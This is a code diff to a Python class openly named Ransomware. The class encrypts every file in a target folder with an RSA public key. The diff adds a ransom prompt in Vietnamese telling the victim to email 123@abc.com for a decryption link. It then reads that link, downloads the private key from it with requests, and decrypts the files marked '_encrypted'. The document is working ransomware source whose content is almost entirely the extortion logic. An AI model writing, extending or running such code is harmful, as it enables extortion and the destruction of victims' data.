@@ -1,7 +1,8 @@
 import os
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
-import base64
+import requests
+
 class Ransomware:
     def __init__(self):
         self.path_folder='target'
@@ -46,6 +47,7 @@ GG/h+fUjqOHqrACFWfKyIzPypQOKICPOZ2P8ffrDiRmRB96mKNoHhSz42MNk7RmX
 
 
     def decrypt(self,dataFile):
+
         with open(dataFile, 'rb') as f:
             data = f.read()
         data = bytes(data)
@@ -59,9 +61,17 @@ GG/h+fUjqOHqrACFWfKyIzPypQOKICPOZ2P8ffrDiRmRB96mKNoHhSz42MNk7RmX
     def run(self):
         for f in os.listdir(self.path_folder):
             self.encrypt(os.path.join(self.path_folder,f))
-    def get_link_decrypt():
+    def decrypt_folder(self,link):
+        private = requests.get(link)
+        self.private_key = RSA.import_key(private.text)
+        for f in os.listdir(self.path_folder):
+            if ('_encrypted' in f):
+                self.decrypt(os.path.join(self.path_folder,f))
+    def get_link_decrypt(self):
         print('liên hệ 123@abc.com để nhận link giải mã')
         print('Nhập mã tại đây')
+        a = input()
+        self.decrypt_folder(a)
 
 rans =Ransomware()
-rans.run()
+rans.get_link_decrypt()
